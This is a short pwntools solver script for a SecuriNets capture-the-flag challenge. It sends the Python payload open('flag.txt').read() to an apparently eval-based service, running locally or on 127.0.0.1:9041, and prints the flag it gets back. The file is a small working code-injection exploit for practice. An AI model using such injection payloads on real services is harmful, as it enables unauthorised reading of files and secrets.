#!/usr/bin/env python3

from pwn import *


context.log_level = "error"

p = process(["python3", "-u", "chall.py"]) if args.LOCAL else remote("127.0.0.1", 9041)

p.sendlineafter(b"> ", b'open("flag.txt").read()')
p.recvuntil(b"SecuriNets{")
flag = b"SecuriNets{" + p.recvuntil(b"}")
print(flag.decode())
p.close()
